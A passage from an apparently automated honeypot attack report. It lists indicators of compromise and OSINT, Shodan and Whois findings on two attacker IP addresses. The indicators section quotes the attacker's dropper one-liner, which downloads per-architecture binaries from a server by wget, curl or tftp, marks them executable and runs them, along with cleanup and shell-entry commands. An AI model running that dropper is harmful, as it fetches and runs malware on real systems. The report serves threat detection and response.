   - Commands attempting to enter privileged modes or shells: `enable`, `system`, `shell`, `sh`, `linuxshell`
   - Commands to create, display, and delete a file in `/tmp/`: `echo \"senpai\" > rootsenpai; cat rootsenpai; rm -rf rootsenpai`
   - Commands related to downloading and executing additional binaries: `for arch in $binarys; do wget http://$server_ip/bins/$arch -O $output || curl -o $output http://$server_ip/bins/$arch || tftp -g -l $output -r $arch $server_ip || tftp $server_ip -c get $arch -l $output; chmod 777 $output; ./$output $1; rm -rf $arch; rm -rf $output; done`

4. **Unusual Files or Directories**:
   - The presence of unexpected files in `/tmp/`, especially with names like 'ah', 'rootsenpai', or similar unexpected artifacts.
   - Evidence of downloaded binaries for multiple architectures or platforms.

5. **Unexpected Network Traffic**:
   - Outbound connections to `94.156.68.152` or similar IP addresses known to host malicious content.
   - Any attempts to download or execute files from external sources not typically accessed by the system.

6. **Unexpected Process Termination Activity**:
   - Use of scripts or commands that kill processes, especially with a focus on removing traces of files or processes (`kill -9 $(basename $dir)`).

7. **Anomalies in System Logs**:
   - Unauthorized SSH login attempts, especially if originating from the attacker's IP.
   - Log entries indicating that file execution permissions were modified (chmod).

8. **File Execution in Suspicious Locations**:
   - Execution of files in the `/tmp/` directory or other locations that do not commonly run executables.

Identifying these IOCs in a system can help determine if a compromise has occurred and guide the response and remediation actions. It is important to remember that IOCs can change over time as attackers modify their tactics, so it is crucial to stay updated with the latest threat intelligence data.

# What do you know about the attacker?
Based on the Open Source Intelligence (OSINT) sources, we've gathered the following critical findings about the IP address `204.76.203.13` involved in the attack:

- **Shodan**: No information was found in the Shodan database.
- **ISC**: The IP has been reported for malicious activity twice and has targeted at least one honeypot. It was first seen on 2023-10-24 and last seen on 2023-12-03. The IP is associated with the Autonomous System "INTELLIGENCE-ATOM-HOSTING" and is based in Saint Kitts and Nevis. It is listed on threat feeds such as blocklistde22 and ciarmy.
- **ThreatFox**: No data was available from ThreatFox for this IP address.
- **CyberGordon**: The IP has been reported as malicious over several months and is known for internet scanning activities. It is associated with high risk and brute force attacks, especially targeting SSH. It is on multiple blocklists indicating a history of abuse and bot activity. The IP is associated with a data center or web hosting services with a 100% risk score on AbuseIPDB and reported in many other feeds and lists as a source of attack attempts.

In summary, the IP address `204.76.203.13` is a known source of malicious activity with multiple reports of scanning and brute force attacks, particularly on SSH services. The IP is associated with a high level of threat, has targeted honeypots, and is featured in various security-related blocklists, indicating a substantial risk. The geographical location of the attacker's IP is Saint Kitts and Nevis, and it appears to be associated with a hosting provider specialized in data center and transit services.

<details>
<summary>
<h2>IP Locations</h2>
</summary>


### IP Locations Summary
Based on the data retrieved from the Shodan database, there is no information available for the IP address `204.76.203.13`. The Shodan database returned a `404: Not Found` error which indicates that there may be no records or the IP might not be indexed.

Without further details from Shodan or other geolocation services, we have limited knowledge about the physical location or the associated network information of the attacking IP address. We could attempt to use alternative sources for geolocation and IP analysis to gather more contextual information about the attacker's location.

* This attack involved `2` unique IP addresses. `1` were source IPs.`1` unique IPs and `1` unique URLS were found in the commands.`1` unique IPs and `1` unique URLS were found in malware.
* The most common **Country** of origin was `Netherlands`, which was seen `1` times.
* The most common **City** of origin was `Amsterdam`, which was seen `1` times.
* The most common **ISP** of origin was `Limenet`, which was seen `1` times.
* The most common **Organization** of origin was `Neterra Ltd.`, which was seen `1` times.
* The most common **ASN** of origin was `AS394711`, which was seen `1` times.
* The most common **network** of origin was `94.156.68.0/24`, which was seen `1` times.


| IP Address | Country | City | ISP | Organization | ASN | Network |
| --- | --- | --- | --- | --- | --- | --- |
| 94.156.68.152 | Netherlands | Amsterdam | Limenet | Neterra Ltd. | AS394711 | 94.156.68.0/24 |

</details>

---


<details>
<summary>
<h2>CyberGordon</h2>
</summary>


### CyberGordon Results Summary
The following summarized information about the IP address `204.76.203.13` involved in the attack has been gathered using CyberGordon:

- **GreyNoise**: Classified as malicious, the IP has been actively scanning the Internet in the last 3 months, with the last report on 03 December 2023.
- **MetaDefender**: The IP is found in three different sources indicating high risk, with activities related to brute force and scanning.
- **IPdata.co**: Geolocation points to Saint Kitts and Nevis. The IP is involved in malicious/attacker activity and abuse/bot activity, appearing on numerous blocklists.
- **AbuseIPDB**: The service provider is Intelligence Hosting LLC, utilizing the network primarily for data center/web hosting/transit usage. It poses a 100% risk with 1354 reports by 646 users, with the last report on 04 December 2023.
- **Pulsedive**: Medium risk assessment with recent activity observed on 29 Nov 2023. The IP is listed in threat lists related to SSH brute force attacks and appears on several brute force hosts feeds.
- **DShield/ISC**: Appears in 2 reports targeting 1 honeypot, with the most recent activity on 3 Dec 2023.
- **BlackList DE**: Found in 133 attacks and 3 reports, indicating a significant track record of malicious activity.
- **Offline Feeds**: Appearances on IPsum and other blocklists indicate recognition in EU botnets/zombies/scanners lists.

Overall, the data paints a picture of `204.76.203.13` as an IP with a high level of malicious intent, frequently engaged in online scanning and brute force attacks, with numerous reports across various security platforms.

* `22` total alerts were found across all engines.
* `6` were **high** priority. 
* `9` were **medium** priority. 
* `7` were **low** priority. 
* The IP address with the **most high priority alerts** was `204.76.203.13` with `4` alerts.


| IP Addresss | Alerts High \| Med \| Low | [E1] IPinfo | [E2] AbuseIPDB | [E4] urlscan.io | [E7] Google DNS | [E11] DShield/ISC | [E12] AlienVault OTX | [E17] Pulsedive | [E19] ThreatMiner | [E23] Offline Feeds | [E24] BlackList DE | [E26] MetaDefender | [E33] GreyNoise | [E34] IPdata.co |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 204.76.203.13 | `4` \| `4` \| `3` | <details>`Geo: New York City, New York, US. Network: AS400328 Intelligence Hosting LLC. `<summary>`low`</summary></details> | <details>` ISP: Intelligence Hosting LLC. Usage: Data Center/Web Hosting/Transit. Risk 100%. 1354 report(s) by 646 user(s), last on 04 December 2023  `<summary>`high`</summary></details> | None | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 2 report(s) listing 1 target(s), last on 3 Dec 2023 `<summary>`medium`</summary></details> | None | <details>`Risk: medium. Last seen on 29 Nov 2023. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): SSH. `<summary>`medium`</summary></details> | <details>`Engine request error,Engine request error,Engine request error `<summary>`low`</summary></details> | <details>`Found in IPsum (3+ blocklists), Duggy Tuxy - EU Botnets/Zombies/Scanners `<summary>`medium`</summary></details> | <details>`Found in 133 attack(s) and 3 report(s) `<summary>`medium`</summary></details> | <details>`Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner) `<summary>`high`</summary></details> | <details>`Last report on 03 December 2023 as malicious and scanning the Internet in the last 3 months. `<summary>`high`</summary></details> | <details>`Geo: Saint Kitts and Nevis. Network: unknown. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Blocklist.de, Blocklist.net.ua, Charles Haley, DataPlane.org, GreenSnow, Interserver.net, isx.fr, James Brine, LiquidBinary, Megumin.ru, Rutgers, Scriptz Team, USTC.edu.cn. `<summary>`high`</summary></details> |
| 94.156.68.152 | `2` \| `5` \| `4` | <details>`Geo: Amsterdam, North Holland, NL. Network: AS394711 Limenet. `<summary>`low`</summary></details> | <details>` ISP: LIMENET. Usage: Data Center/Web Hosting/Transit. Risk 4%. 3 report(s) by 1 user(s), last on 30 November 2023  `<summary>`medium`</summary></details> | <details>`Found in 10 scan(s). Reported in urlhaus feed(s). Top 5 domains: 94.156.68.152 (10) `<summary>`medium`</summary></details> | <details>`No DNS PTR record found `<summary>`low`</summary></details> | <details>`Found in 478 report(s) listing 34 target(s), last on 3 Dec 2023 `<summary>`high`</summary></details> | <details>`Found in 7 pulse-feed(s) `<summary>`medium`</summary></details> | <details>`Risk: unknown. Last seen on 1 Dec 2023. `<summary>`low`</summary></details> | <details>`Engine request error,Engine request error,Engine request error `<summary>`low`</summary></details> | <details>`Found in DigitalSide (last 7 days) `<summary>`medium`</summary></details> | None | <details>`Found in 2 sources: webroot.com (high risk), avira.com (Malware) `<summary>`medium`</summary></details> | None | <details>`Geo: Karlovo, Plovdiv, Bulgaria. Network: AS394711, Limenet, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch, DigitalSide. `<summary>`high`</summary></details> |

### CyberGordon Results

<details>
<summary>
<h3>Cybergordon results for: 94.156.68.152</h3>
</summary>


### Cybergordon results for: 94.156.68.152 [https://cybergordon.com/r/9279ae7a-0cff-458d-8351-82fe5c679f8d](https://cybergordon.com/r/9279ae7a-0cff-458d-8351-82fe5c679f8d)

| Engine | Results | Url |
| --- | --- | --- |
| [E11] DShield/ISC | Found in 478 report(s) listing 34 target(s), last on 3 Dec 2023  | https://isc.sans.edu/ipinfo.html?ip=94.156.68.152 |
| [E34] IPdata.co | Geo: Karlovo, Plovdiv, Bulgaria. Network: AS394711, Limenet, business. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Abuse.ch, DigitalSide.  | https://ipdata.co |
| [E2] AbuseIPDB |  ISP: LIMENET. Usage: Data Center/Web Hosting/Transit. Risk 4%. 3 report(s) by 1 user(s), last on 30 November 2023   | https://www.abuseipdb.com/check/94.156.68.152 |
| [E26] MetaDefender | Found in 2 sources: webroot.com (high risk), avira.com (Malware)  | https://metadefender.opswat.com |
| [E4] urlscan.io | Found in 10 scan(s). Reported in urlhaus feed(s). Top 5 domains: 94.156.68.152 (10)  | https://urlscan.io/search/#ip%3A%2294.156.68.152%22 |
| [E23] Offline Feeds | Found in DigitalSide (last 7 days)  | / |
| [E12] AlienVault OTX | Found in 7 pulse-feed(s)  | https://otx.alienvault.com/indicator/ip/94.156.68.152 |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=152.68.156.94.in-addr.arpa&type=PTR |
| [E19] ThreatMiner | Engine request error,Engine request error,Engine request error  | https://www.threatminer.org/host.php?q=94.156.68.152 |
| [E17] Pulsedive | Risk: unknown. Last seen on 1 Dec 2023.  | https://pulsedive.com/browse |
| [E1] IPinfo | Geo: Amsterdam, North Holland, NL. Network: AS394711 Limenet.  | https://ipinfo.io/94.156.68.152 |

</details>

---


<details>
<summary>
<h3>Cybergordon results for: 204.76.203.13</h3>
</summary>


### Cybergordon results for: 204.76.203.13 [https://cybergordon.com/r/3e4c927e-1a1f-4848-baa1-2e1f12cfce28](https://cybergordon.com/r/3e4c927e-1a1f-4848-baa1-2e1f12cfce28)

| Engine | Results | Url |
| --- | --- | --- |
| [E33] GreyNoise | Last report on 03 December 2023 as malicious and scanning the Internet in the last 3 months.  | https://viz.greynoise.io/ip/204.76.203.13 |
| [E26] MetaDefender | Found in 3 sources: webroot.com (high risk), dataplane.org (bruteforce, scanner), blocklist.de (scanner)  | https://metadefender.opswat.com |
| [E34] IPdata.co | Geo: Saint Kitts and Nevis. Network: unknown. Security risk(s): malicious/attacker activity, abuse/bot activity. Blocklist(s): Anti-attacks.com, Blocklist.de, Blocklist.net.ua, Charles Haley, DataPlane.org, GreenSnow, Interserver.net, isx.fr, James Brine, LiquidBinary, Megumin.ru, Rutgers, Scriptz Team, USTC.edu.cn.  | https://ipdata.co |
| [E2] AbuseIPDB |  ISP: Intelligence Hosting LLC. Usage: Data Center/Web Hosting/Transit. Risk 100%. 1354 report(s) by 646 user(s), last on 04 December 2023   | https://www.abuseipdb.com/check/204.76.203.13 |
| [E17] Pulsedive | Risk: medium. Last seen on 29 Nov 2023. Found in threat list(s): SSH Brute Force. Found in feed list(s): Blocklist.de Blocklist, Dictionary SSH Attacks, Brute Force Hosts. Opened service(s): SSH.  | https://pulsedive.com/browse |
| [E11] DShield/ISC | Found in 2 report(s) listing 1 target(s), last on 3 Dec 2023  | https://isc.sans.edu/ipinfo.html?ip=204.76.203.13 |
| [E24] BlackList DE | Found in 133 attack(s) and 3 report(s)  | https://www.blocklist.de/en/search.html?ip=204.76.203.13 |
| [E23] Offline Feeds | Found in IPsum (3+ blocklists), Duggy Tuxy - EU Botnets/Zombies/Scanners  | / |
| [E7] Google DNS | No DNS PTR record found  | https://dns.google/query?name=13.203.76.204.in-addr.arpa&type=PTR |
| [E1] IPinfo | Geo: New York City, New York, US. Network: AS400328 Intelligence Hosting LLC.  | https://ipinfo.io/204.76.203.13 |
| [E19] ThreatMiner | Engine request error,Engine request error,Engine request error  | https://www.threatminer.org/host.php?q=204.76.203.13 |

</details>

---


</details>

---


<details>
<summary>
<h2>Shodan</h2>
</summary>


### Shodan Results Summary
The Shodan database does not provide any information on the IP address `204.76.203.13` involved in the attack. The database returned an `ERROR: 404: Not Found`, which means there are no records or that the IP address might not be indexed by Shodan. As a result, we have no data from Shodan regarding open ports, running services, geolocation, or other attributes typically assessed during an IP address analysis. If more detailed information is needed, alternative sources or methods would need to be employed to gather intelligence about this IP address.

- The most common **open port** was `21`, which was seen `1` times.
- The most common **protocol** was `tcp`, which was seen `3` times.
- The most common **service name** was `unknown`, which was seen `1` times.
- The most common **service signature** was `220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK.`, which was seen `1` times.
- The most common **Country** was `Netherlands`, which was seen `1` times.
- The most common **City** was `Amsterdam`, which was seen `1` times.
- The most common **Organization** was `Neterra Ltd.`, which was seen `1` times.
- The most common **ISP** was `Limenet`, which was seen `1` times.
- The most common **ASN** was `AS394711`, which was seen `1` times.
- The IP address with the **most open ports** was `94.156.68.152` with `3` open ports.

| IP Addresss | # Open Ports | 21 | 22 | 80 |
| --- | --- | --- | --- | --- |
| 94.156.68.152 | <details>`21`, `22`, `80`<summary>`3`</summary></details> | unknown | OpenSSH7.4 | Apache httpd2.4.6 |

<details>
<summary>
<h4>Top 3 Open Ports</h4>
</summary>

Total Open Ports: `3`
Unique: `3`

| Open Port | Times Seen |
| --- | --- |
| `21` | `1` |
| `22` | `1` |
| `80` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Protocols</h4>
</summary>

Total Protocols: `3`
Unique: `1`

| Protocol | Times Seen |
| --- | --- |
| `tcp` | `3` |

</details>

---




<details>
<summary>
<h4>Top 3 Service Names</h4>
</summary>

Total Service Names: `3`
Unique: `3`

| Service Name | Times Seen |
| --- | --- |
| `unknown` | `1` |
| `OpenSSH7.4` | `1` |
| `Apache httpd2.4.6` | `1` |

</details>

---




<details>
<summary>
<h4>Top 3 Service Signatures</h4>
</summary>

Total Service Signatures: `3`
Unique: `3`

| Service Signature | Times Seen |
| --- | --- |
| `220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK.` | `1` |
| `SSH-2.0-OpenSSH_7.4` | `1` |
| `HTTP/1.1 403 Forbidden` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Countrys</h4>
</summary>

Total Countrys: `1`
Unique: `1`

| Country | Times Seen |
| --- | --- |
| `Netherlands` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Citys</h4>
</summary>

Total Citys: `1`
Unique: `1`

| City | Times Seen |
| --- | --- |
| `Amsterdam` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 Organizations</h4>
</summary>

Total Organizations: `1`
Unique: `1`

| Organization | Times Seen |
| --- | --- |
| `Neterra Ltd.` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 ISPs</h4>
</summary>

Total ISPs: `1`
Unique: `1`

| ISP | Times Seen |
| --- | --- |
| `Limenet` | `1` |

</details>

---




<details>
<summary>
<h4>Top 1 ASNs</h4>
</summary>

Total ASNs: `1`
Unique: `1`

| ASN | Times Seen |
| --- | --- |
| `AS394711` | `1` |

</details>

---


### Shodan Results

<details>
<summary>
<h3>Shodan results for: 94.156.68.152</h3>
</summary>


### Shodan results for: 94.156.68.152 [https://www.shodan.io/host/94.156.68.152](https://www.shodan.io/host/94.156.68.152)

| Country | City | Organization | ISP | ASN |
| --- | --- | --- | --- | --- |
| Netherlands | Amsterdam | Neterra Ltd. | Limenet | AS394711 |

#### Open Ports

| Port | Protocol | Service | Update Time |
| --- | --- | --- | --- |
| 21 | tcp | unknown | 2023-11-28T19:49:02.405733 |
| 22 | tcp | OpenSSH7.4 | 2023-12-02T17:34:27.796499 |
| 80 | tcp | Apache httpd2.4.6 | 2023-11-27T20:17:54.123017 |

#### Port 21 (tcp): unknown

<details>
<summary>
<h4>Raw Service Data for Port 21 (tcp): unknown</h4>
</summary>


```
220 (vsFTPd 3.0.2)
230 Login successful.
214-The following commands are recognized.
 ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD
 MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR
 RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD
 XPWD XRMD
214 Help OK.
211-Features:
 EPRT
 EPSV
 MDTM
 PASV
 REST STREAM
 SIZE
 TVFS
 UTF8
211 End
```

</details>

---


| Key | Value |
| --- | --- |
| sig | 220 (vsFTPd 3.0.2)230 Login successful.214-The following commands are recognized. ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD XPWD XRMD214 Help OK. |
| 211-Features | [' ', 'E', 'P', 'R', 'T', ' ', 'E', 'P', 'S', 'V', ' ', 'M', 'D', 'T', 'M', ' ', 'P', 'A', 'S', 'V', ' ', 'R', 'E', 'S', 'T', ' ', 'S', 'T', 'R', 'E', 'A', 'M', ' ', 'S', 'I', 'Z', 'E', ' ', 'T', 'V', 'F', 'S', ' ', 'U', 'T', 'F', '8', '2', '1', '1', ' ', 'E', 'n', 'd'] |

#### Port 22 (tcp): OpenSSH7.4

<details>
<summary>
<h4>Raw Service Data for Port 22 (tcp): OpenSSH7.4</h4>
</summary>


```
SSH-2.0-OpenSSH_7.4
Key type: ssh-rsa
Key: AAAAB3NzaC1yc2EAAAADAQABAAABAQDVk706hyNKKMIyTiyljpCLDlZvP2WZMboioRwJlIY3BhOE
1CFBb3lqGRfc+MAge40tnshk40YqtyHTSU4gNDB2J0r0SspA1916fJMjaGHjz/SUeiU/gRem1xs1
vTfI5B4Ngmy7FWyIB30c6WjI3M8LSogEVGuF8MFgXc6cB8Idtqzj18la1ONYQhT4dzTmlJgxRons
om75mv0bTp5IMNCv3gPGKtC8jlDC0B0yU4aqNspEy6WxGBGg7oBt6ukLM3qWb5HFFl0FRkQ1j0By
0CQ2hcoONFVs3Hilrrlhg0N3ukXiTWRSrvYNlDHnQ996dHLpuBIwAwtplUaCvB+Qqmaf
Fingerprint: 23:5b:20:48:1b:8c:9f:38:94:a3:33:58:2e:62:68:7b

Kex Algorithms:
	curve25519-sha256
	curve25519-sha256@libssh.org
	ecdh-sha2-nistp256
	ecdh-sha2-nistp384
	ecdh-sha2-nistp521
	diffie-hellman-group-exchange-sha256
	diffie-hellman-group16-sha512
	diffie-hellman-group18-sha512
	diffie-hellman-group-exchange-sha1
	diffie-hellman-group14-sha256
	diffie-hellman-group14-sha1
	diffie-hellman-group1-sha1

Server Host Key Algorithms:
	ssh-rsa
	rsa-sha2-512
	rsa-sha2-256
	ecdsa-sha2-nistp256
	ssh-ed25519

Encryption Algorithms:
	chacha20-poly1305@openssh.com
	aes128-ctr
	aes192-ctr
	aes256-ctr
	aes128-gcm@openssh.com
	aes256-gcm@openssh.com
	aes128-cbc
	aes192-cbc
	aes256-cbc
	blowfish-cbc
	cast128-cbc
	3des-cbc

MAC Algorithms:
	umac-64-etm@openssh.com
	umac-128-etm@openssh.com
	hmac-sha2-256-etm@openssh.com
	hmac-sha2-512-etm@openssh.com
	hmac-sha1-etm@openssh.com
	umac-64@openssh.com
	umac-128@openssh.com
	hmac-sha2-256
	hmac-sha2-512
	hmac-sha1

Compression Algorithms:
	none
	zlib@openssh.com
```

</details>

---


| Key | Value |
| --- | --- |
| sig | SSH-2.0-OpenSSH_7.4 |
| Key type | ssh-rsa |
| Key | AAAAB3NzaC1yc2EAAAADAQABAAABAQDVk706hyNKKMIyTiyljpCLDlZvP2WZMboioRwJlIY3BhOE1CFBb3lqGRfc+MAge40tnshk40YqtyHTSU4gNDB2J0r0SspA1916fJMjaGHjz/SUeiU/gRem1xs1vTfI5B4Ngmy7FWyIB30c6WjI3M8LSogEVGuF8MFgXc6cB8Idtqzj18la1ONYQhT4dzTmlJgxRonsom75mv0bTp5IMNCv3gPGKtC8jlDC0B0yU4aqNspEy6WxGBGg7oBt6ukLM3qWb5HFFl0FRkQ1j0By0CQ2hcoONFVs3Hilrrlhg0N3ukXiTWRSrvYNlDHnQ996dHLpuBIwAwtplUaCvB+Qqmaf |
| Fingerprint | 23:5b:20:48:1b:8c:9f:38:94:a3:33:58:2e:62:68:7b |
| Kex Algorithms | ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha1', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1', 'diffie-hellman-group1-sha1'] |
| Server Host Key Algorithms | ['ssh-rsa', 'rsa-sha2-512', 'rsa-sha2-256', 'ecdsa-sha2-nistp256', 'ssh-ed25519'] |
| Encryption Algorithms | ['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com', 'aes128-cbc', 'aes192-cbc', 'aes256-cbc', 'blowfish-cbc', 'cast128-cbc', '3des-cbc'] |
| MAC Algorithms | ['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] |
| Compression Algorithms | ['none', 'zlib@openssh.com'] |

#### Port 80 (tcp): Apache httpd2.4.6

<details>
<summary>
<h4>Raw Service Data for Port 80 (tcp): Apache httpd2.4.6</h4>
</summary>


```
HTTP/1.1 403 Forbidden
Date: Mon, 27 Nov 2023 20:17:54 GMT
Server: Apache/2.4.6 (CentOS)
Last-Modified: Thu, 16 Oct 2014 13:20:58 GMT
ETag: "1321-5058a1e728280"
Accept-Ranges: bytes
Content-Length: 4897
Content-Type: text/html; charset=UTF-8
```

</details>

---


| Key | Value |
| --- | --- |
| sig | HTTP/1.1 403 Forbidden |
| Date | Mon, 27 Nov 2023 20:17:54 GMT |
| Server | Apache/2.4.6 (CentOS) |
| Last-Modified | Thu, 16 Oct 2014 13:20:58 GMT |
| ETag | "1321-5058a1e728280" |
| Accept-Ranges | bytes |
| Content-Length | 4897 |
| Content-Type | text/html; charset=UTF-8 |

</details>

---


</details>

---


<details>
<summary>
<h2>ThreatFox</h2>
</summary>


### ThreatFox Results Summary
The ThreatFox database does not provide any information on the IP address `204.76.203.13` involved in the attack. There is no data returned, indicating that threat intelligence related to this IP address may not be available in ThreatFox or that the IP has not been associated with known indicators of compromise (IoCs) in their database. Without any detailed information from ThreatFox, we don't have additional context regarding this IP's involvement in known malware campaigns or other malicious activities. Further investigation using other threat intelligence sources or analysis methods would be required to learn more about potential threats associated with this IP address.

</details>

---


<details>
<summary>
<h2>Internet Storm Center (ISC)</h2>
</summary>


### Internet Storm Center (ISC) [https://isc.sans.edu/ipinfo/](https://isc.sans.edu/ipinfo/)
The ISC (Internet Storm Center) data for the IP address `204.76.203.13` involved in the attack provides the following information:

- **Total Reports**: There have been 2 reports of malicious activity associated with this IP.
- **Honeypots Targeted**: This IP has targeted 1 honeypot.
- **First Seen**: The IP was first observed by ISC on 2023-10-24.
- **Last Seen**: The most recent observation of this IP by ISC was on 2023-12-03.
- **Network**: The IP is part of the `204.76.203.0/24` network range.
- **AS Name**: The Autonomous System Name is "INTELLIGENCE-ATOM-HOSTING".
- **AS Country Code**: The country code associated with the Autonomous System is "KN", which is Saint Kitts and Nevis.
- **Threat Feeds**: The IP address has been listed on at least two threat feeds:
  - `blocklistde22`: It first appeared on this feed on 2023-11-30 and was last seen on 2023-12-03.
  - `ciarmy`: This feed first saw the IP on 2023-11-12 and last on 2023-12-03.

These details suggest that the IP address `204.76.203.13` has a history of suspicious or malicious activities and has been flagged by multiple threat intelligence sources. Its association with a specific AS and country may provide clues to the attacker's geographical location and possibly their internet service provider or hosting service.

* `2` of the `2` unique source IPs have reports on the Internet Storm Center (ISC).
* `480` total attacks were reported.
* `35` unique targets were attacked.
* The IP address with the **most reports** was `94.156.68.152` with `478` reports.
* The IP address with the **most targets** was `94.156.68.152` with `34` targets.
* The **first report** was on `2023-10-24` from `204.76.203.13`.
* The **most recent** was on `2023-12-03` from `94.156.68.152`.


| IP Address | Total Reports | Targets | First Report | Last Report | Update Time |
| --- | --- | --- | --- | --- | --- |
| 94.156.68.152 | 478 | 34 | 2023-11-30 | 2023-12-03 | 2023-12-04 04:06:55 |
| 204.76.203.13 | 2 | 1 | 2023-10-24 | 2023-12-03 | 2023-12-04 04:06:55 |

<details>
<summary>
<h4>Top 2 As</h4>
</summary>

Total ass: `2`
Unique: `2`

| as | Times Seen |
| --- | --- |
| `394711` | `1` |
| `400328` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Asnames</h4>
</summary>

Total asnames: `2`
Unique: `2`

| asname | Times Seen |
| --- | --- |
| `LIMENET` | `1` |
| `INTELLIGENCE-ATOM-HOSTING` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Ascountrys</h4>
</summary>

Total ascountrys: `2`
Unique: `2`

| ascountry | Times Seen |
| --- | --- |
| `US` | `1` |
| `KN` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Assizes</h4>
</summary>

Total assizes: `2`
Unique: `2`

| assize | Times Seen |
| --- | --- |
| `12800` | `1` |
| `768` | `1` |

</details>

---


<details>
<summary>
<h4>Top 2 Networks</h4>
</summary>

Total networks: `2`
Unique: `2`

| network | Times Seen |
| --- | --- |
| `94.156.68.0/24` | `1` |
| `204.76.203.0/24` | `1` |

</details>

---


<details>
<summary>
<h4>Top 3 Threatfeeds</h4>
</summary>

Total threatfeedss: `3`
Unique: `3`

| threatfeeds | Times Seen |
| --- | --- |
| `threatview` | `1` |
| `blocklistde22` | `1` |
| `ciarmy` | `1` |

</details>

---


</details>

---


<details>
<summary>
<h2>Whois</h2>
</summary>


### Whois Results Summary

<details>
<summary>
<h3>Whois data for: 94.156.68.152</h3>
</summary>


### Whois data for: 94.156.68.152 [https://www.whois.com/whois/94.156.68.152](https://www.whois.com/whois/94.156.68.152)

```
% This is the RIPE Database query service.
% The objects are in RPSL format.
%
% The RIPE Database is subject to Terms and Conditions.
% See https://apps.db.ripe.net/docs/HTML-Terms-And-Conditions

% Note: this output has been filtered.
%       To receive output for a database update, use the "-B" flag.

% Information related to '94.156.68.0 - 94.156.68.255'

% Abuse contact for '94.156.68.0 - 94.156.68.255' is '@limenet.io'

inetnum:        94.156.68.0 - 94.156.68.255
netname:        LIME_NET-NET
country:        NL
mnt-domains:    lime-net-mnt
mnt-routes:     lime-net-mnt
org:            ORG-LA1853-RIPE
admin-c:        IT3219-RIPE
tech-c:         IT3219-RIPE
status:         ASSIGNED PA
mnt-by:         MNT-NETERRA
created:        2023-09-25T06:49:43Z
last-modified:  2023-11-09T09:09:47Z
source:         RIPE

organisation:   ORG-LA1853-RIPE
org-name:       Limenet
org-type:       OTHER
address:        84 W Broadway, Ste 200
address:        03038 Derry
address:        United States of America
abuse-c:        ACRO53914-RIPE
mnt-ref:        limenet-mnt
mnt-ref:        MNT-NETERRA
mnt-by:         limenet-mnt
mnt-by:         MNT-NETERRA
created:        2023-08-30T07:21:20Z
last-modified:  2023-09-25T06:42:09Z
source:         RIPE # Filtered

person:         IT Technical
address:        84 W Broadway, Ste 200
address:        03038 Derry
address:        United States of America
phone:          +1-505-297-1370
nic-hdl:        IT3219-RIPE
mnt-by:         limenet-mnt
created:        2023-08-30T07:18:31Z
last-modified:  2023-08-30T07:26:07Z
source:         RIPE

% Information related to '94.156.68.0/24AS394711'

route:          94.156.68.0/24
origin:         AS394711
mnt-by:         lime-net-mnt
created:        2023-10-23T14:01:55Z
last-modified:  2023-10-23T14:01:55Z
source:         RIPE

% This query was served by the RIPE Database Query Service version 1.108 (BUSA)
```

</details>

---


<details>
<summary>
<h3>Whois data for: 204.76.203.13</h3>
</summary>


### Whois data for: 204.76.203.13 [https://www.whois.com/whois/204.76.203.13](https://www.whois.com/whois/204.76.203.13)

```
#
# ARIN WHOIS data and services are subject to the Terms of Use
# available at: https://www.arin.net/resources/registry/whois/tou/
#
# If you see inaccuracies in the results, please report at
# https://www.arin.net/resources/registry/whois/inaccuracy_reporting/
#
# Copyright 1997-2023, American Registry for Internet Numbers, Ltd.
#


NetRange:       204.76.203.0 - 204.76.203.255
CIDR:           204.76.203.0/24
